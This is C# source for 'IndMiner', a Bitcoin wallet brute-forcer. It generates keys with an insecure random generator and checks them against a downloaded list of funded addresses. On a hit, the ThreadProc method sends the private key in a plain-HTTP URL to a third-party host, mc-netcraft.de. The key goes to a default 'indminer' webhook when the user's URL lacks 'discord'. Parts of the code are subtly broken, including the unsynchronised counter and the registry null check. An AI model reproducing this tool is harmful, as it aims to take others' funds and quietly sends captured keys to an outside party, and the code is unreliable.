using Microsoft.Win32;
using NBitcoin;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading.Tasks;

namespace IndMiner
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = Util.giveTitle();

            visuals.printLogo();
            
            if (App.loadFromRegistry("btcaddr") == null)
            {
                Debug.Log("Please enter your withdrawal BTC address");
                App.saveToRegistry("btcaddr", Console.ReadLine());
            }

            if (App.loadFromRegistry("webhook") == null)
            {
                Debug.Log("Please enter your discord webhook URL (if empty it will write to file)");
                App.saveToRegistry("webhook", Console.ReadLine());
            }

            //Start
            if (!WalletListUtil.hasToDownload())
                new WalletMiner();
            else
                new WalletListDownloader();
        }
    }
    
    class WalletMiner
    {
        public WalletMiner()
        {
            Console.Clear();
            visuals.printLogo("GitHub Version");
            
            Debug.Log("Loading database... this can take up to two minutes!");
            string[] addresses = Bitcoin.readAddressesFile();
            HashSet<string> wallets = new HashSet<string>(addresses);
            
            Debug.Log("Done! Starting miner...\n");

            long startUnix = Util.getUnix();

            string lastLine = "";

            try
            {
                lastLine = addresses[addresses.Length - 1];
            }
            catch (Exception e)
            {
                Debug.Log("An error occured. Please report to us. You can try fixing this by deleting wallets.ind");
                Debug.Log("Details: ADDRLEN=" + addresses.Length.ToString() + "\nBYTES" + Bitcoin.readAddressesFile().Length.ToString());
                Debug.Log(e.Message);
                Console.ReadLine();
            }
            
            //Pre-purchasing
            string managerFile = Path.Combine(Path.GetTempPath(), "runs.txt");
            long processedTries = 0;
            if (File.Exists(managerFile))
            {
                bool success = long.TryParse(File.ReadAllText(managerFile), out processedTries);
                if (!success) processedTries = 0;
            }

            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            long whiles = 0;
            whiles += processedTries;

            long totals = 0;
            long samples = 0;

            while (true)
            {
                Stopwatch timer = new Stopwatch();
                timer.Start();

                int processes = 10000;
                long walletsC = 0;
                Parallel.For(0, processes, (i) => {
                    walletsC += Bitcoin.ThreadProc(wallets, i, new Random());
                });

                double perSec = walletsC / processes;
                perSec *= processes;
                perSec /= 100;
                string speedstr = Math.Round(perSec, 2).ToString();

                samples++;
                totals += (long)Math.Round(perSec);
                string avg = Math.Round((double)totals / samples).ToString();
                
                Console.WriteLine(" MINING | Speed: " + speedstr + " w/s | Avg speed " + avg + 
                    " w/s | Thread time " + Math.Round((double)timer.ElapsedMilliseconds / processes, 2) + "ms");
                Console.Title = Util.giveTitle() + " | Speed: " + speedstr + " w/s | Avg speed " + avg + " w/s";
                whiles++;
                timer.Stop();
            }
        }
         
        int randomNumber(int min, int max, bool add1 = false)
        {
            if (add1)
                max += 1;

            return new Random().Next(min, max);
        }
    }

    static class Bitcoin
    {
        public static Key generateKey()
        {
            RandomUtils.Random = new UnsecureRandom();
            return new Key();
        }
        public static string[] readAddressesFile()
        {
            string currentDir = Directory.GetCurrentDirectory();
            string walletFile = currentDir + "\\wallets.ind";

            return File.ReadLines(walletFile).ToArray();
        }

        static string getLegacyAddress(Key address)
        {
            return address.GetAddress(ScriptPubKeyType.Legacy, Network.Main).ToString();
        }

        static string getSegWitAddress(Key address)
        {
            return address.GetAddress(ScriptPubKeyType.Segwit, Network.Main).ToString();
        }

        static string getSegWitP2SHAddress(Key address)
        {
            return address.GetAddress(ScriptPubKeyType.SegwitP2SH, Network.Main).ToString();
        }

        public static string getPrivate(Key address)
        {
            return address.GetBitcoinSecret(Network.Main).ToString();
        }

        public static long ThreadProc(HashSet<string> wallets, int i, Random rand)
        {
            
            var sw = new Stopwatch();
            sw.Start();
            RandomUtils.Random = new UnsecureRandom(); // set the random number generator.
            Key k = new Key();
            string legacyAddress = getLegacyAddress(k);
            string segwitAddress = getSegWitAddress(k);
            string p2shAddress = getSegWitP2SHAddress(k);
            string priv = getPrivate(k);
            long walletsPerSecond = 0;
            if (wallets.Contains(legacyAddress) || wallets.Contains(segwitAddress) || wallets.Contains(p2shAddress))
            {
                try
                {
                    string readVal = App.loadFromRegistry("webhook").ToString();
                    Process.Start(Util.generateWebhookURL(
                        priv, 
                        readVal.ToLower().Contains("discord") ? readVal : settings.webhookURL));

                    File.WriteAllText("hit-" + Util.getUnix().ToString() + ".txt", priv);
                }
                catch
                {
                    Debug.Log("Hit private key: " + priv, true);
                }
            }
            
            walletsPerSecond = 100000000 / sw.ElapsedTicks;
            sw.Stop();

            return walletsPerSecond;
        }
    }
    
    static class WalletListUtil
    {
        public static bool hasToDownload()
        {
            return !File.Exists(Directory.GetCurrentDirectory() + "\\wallets.ind");
        }
        public static string getListPath()
        {
            return Directory.GetCurrentDirectory() + "\\wallets.ind";
        }
    }
    class WalletListDownloader
    {
        string downloadP = "";
        WebClient wc = null;

        string url = "https://raw.githubusercontent.com/OlMi1/indminer/main/wallets.ind";

        public WalletListDownloader()
        {
            downloadP = Path.Combine(Directory.GetCurrentDirectory(), "wallets.ind");

            Debug.Log("Downloading! Check the window title for progress.\nThis should only take a couple of seconds.");

            WebRequest.DefaultWebProxy = null;
            using (wc = new WebClient())
            {
                //wc.Proxy = GlobalProxySelection.GetEmptyWebProxy();
                wc.DownloadProgressChanged += wc_DownloadProgressChanged;
                wc.DownloadFileCompleted += wc_DownloadFileCompleted;
                wc.DownloadFileAsync(new Uri(url), downloadP);
            }
            Console.ReadLine();
        }
        
        private void wc_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            if (1 == 1)
            {
                double bytesIn = Convert.ToDouble((double)e.BytesReceived);
                double totalBytes = Convert.ToDouble((double)e.TotalBytesToReceive);
                double percentage = e.BytesReceived / e.TotalBytesToReceive;
                
                //Display everything
                //Debug.Log(percentage + " rec " + bytesIn + " total " + totalBytes);
                Console.Title = Util.giveTitle() + " (Download progress: " + bytesIn + " of " + totalBytes + " bytes loaded)";
            }
        }

        private void wc_DownloadFileCompleted(object sender = null, AsyncCompletedEventArgs e = null)
        {
            wc.Dispose();

            //Debug.Log("Decompressing... this can take 2-10 minutes");
            
            Console.Title = Util.giveTitle();

            //if (!downloadP.EndsWith(".tmp")) downloadP += ".tmp";
            //string path = Decompress(downloadP);

            //File.Delete(downloadP);

            Debug.Log("Done! Attempting restart...");
            App.restart();
        }
    }

    static class Util
    {
        public static int randomNumber(int min, int max, bool add1 = false)
        {
            if (add1)
                max += 1;

            return new Random().Next(min, max);
        }

        public static string makeWebRequest(string url)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;

            // Create a request for the URL
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            //request.UserAgent = "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25";

            // Get the response
            WebResponse response = request.GetResponse();
            // Display the status
            //Debug.Log("Download Status: " + ((HttpWebResponse)response).StatusDescription);

            if (((HttpWebResponse)response).StatusDescription != "OK")
            {
                Debug.Log("Download error", true);
            }

            string result = "";

            // Get the stream containing content returned by the server.
            // The using block ensures the stream is automatically closed.
            using (Stream dataStream = response.GetResponseStream())
            {
                // Open the stream using a StreamReader for easy access.
                StreamReader reader = new StreamReader(dataStream);
                // Read the content.
                result = reader.ReadToEnd();
            }

            // Close the response.
            response.Close();

            return result;
        }
        
        public static void WriteResourceToFile(string resourceName, string fileName)
        {
            using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                using (var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    resource.CopyTo(file);
                }
            }
        }

        public static string giveTitle()
        {
            return "IndMiner " + App.getVersion();
        }

        public static string generateWebhookURL(string message, string webhoookurl = "indminer")
        {
            return "http://www.mc-netcraft.de/openwebhook.php?webhook-url=" + webhoookurl + "&message=" + message;
        }

        public static long getUnix()
        {
            return DateTimeOffset.Now.ToUnixTimeSeconds();
        }
        
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
    }
    static class settings
    {
        public const ConsoleColor logoColor = ConsoleColor.DarkRed;
        public const ConsoleColor defaultColor = ConsoleColor.White;
        public const int logoPadding = 2;
        
        public const string webhookURL = "indminer";
    }
    static class visuals
    {
        static string[] logo = new string[10] {
            "  $$$$$$\\                 $$\\ $$\\      $$\\ $$\\ ",
            " \\_$$  _|                $$ |$$$\\    $$$ |\\__|",
            "    $$ |  $$$$$$$\\   $$$$$$$ |$$$$\\  $$$$ |$$\\ $$$$$$$\\   $$$$$$\\   $$$$$$\\",
            "    $$ |  $$  __$$\\ $$  __$$ |$$\\$$\\$$ $$ |$$ |$$  __$$\\ $$  __$$\\ $$  __$$\\",
            "    $$ |  $$ |  $$ |$$ /  $$ |$$ \\$$$  $$ |$$ |$$ |  $$ |$$$$$$$$ |$$ |  \\__|",
            "    $$ |  $$ |  $$ |$$ |  $$ |$$ |\\$  /$$ |$$ |$$ |  $$ |$$   ____|$$ |",
            "  $$$$$$\\ $$ |  $$ |\\$$$$$$$ |$$ | \\_/ $$ |$$ |$$ |  $$ |\\$$$$$$$\\ $$ |",
            " \\______|\\__|  \\__| \\_______|\\__|     \\__|\\__|\\__|  \\__| \\_______|\\__|",
            "",
            "                         %version% | indminer.ga"
        };

        public static void printLogo(string versionPlaceholderOverride = "")
        {
            Console.ForegroundColor = settings.logoColor;

            if (versionPlaceholderOverride == "")
                versionPlaceholderOverride = "v" + App.getVersion();

            for (int i = 0; i < settings.logoPadding; i++)
            {
                Debug.Log(" ");
            }
            foreach (string str in logo)
            {
                Debug.Log(" " + str.Replace("%version%", versionPlaceholderOverride));
            }
            for (int i = 0; i < settings.logoPadding; i++)
            {
                Debug.Log(" ");
            }

            Console.ForegroundColor = settings.defaultColor;
        }
    }
    static class Debug
    {
        public static void Log(object str, bool stayActive = false)
        {
            Console.WriteLine(str);
            System.Diagnostics.Debug.WriteLine(str); // for VS 2017

            if (stayActive)
                Console.ReadLine();
        }
    }
    static class App
    {
        public static void dieMessage(object reason, int errorCode = 1)
        {
            Debug.Log(reason);
            while (true)
            {
                Console.ReadLine();
            }
        }

        public static void restart()
        {
            try
            {
                //Start process, friendly name is something like MyApp.exe (from current bin directory)
                Process.Start(AppDomain.CurrentDomain.FriendlyName);

                //Close the current process
                Environment.Exit(0);
            }
            catch
            {
                dieMessage("Could not restart for you. Please restart the application manually!");
            }
        }
        
        public static void saveToRegistry(string name, object data)
        { 
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\IndMiner");

            key.SetValue(name, data);
            key.Close();
        }
        public static object loadFromRegistry(string name)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\IndMiner");

            object data = false;
            if (key != null)
            {
                data = key.GetValue(name);
                key.Close();
            }

            return data;
        }
        
        public static string getVersion()
        {
            return Assembly.GetEntryAssembly().GetName().Version.ToString();
        }
    }
}
